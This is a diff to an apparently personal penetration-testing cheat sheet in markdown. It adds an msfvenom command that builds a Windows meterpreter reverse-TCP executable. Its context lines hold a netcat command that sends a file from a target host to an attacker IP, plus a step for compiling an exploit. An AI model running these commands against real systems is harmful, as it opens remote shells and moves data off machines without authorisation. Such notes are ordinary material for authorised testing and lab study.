@@ -189,6 +189,9 @@ Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
 ## compile code:
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
+## create payload:
+windows: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe` <br/>
+
 # Solutions
 ## Port in used (Python server) 
 Message "Address is already in use": `lsof -i:80` kill corresponding app.<br/>
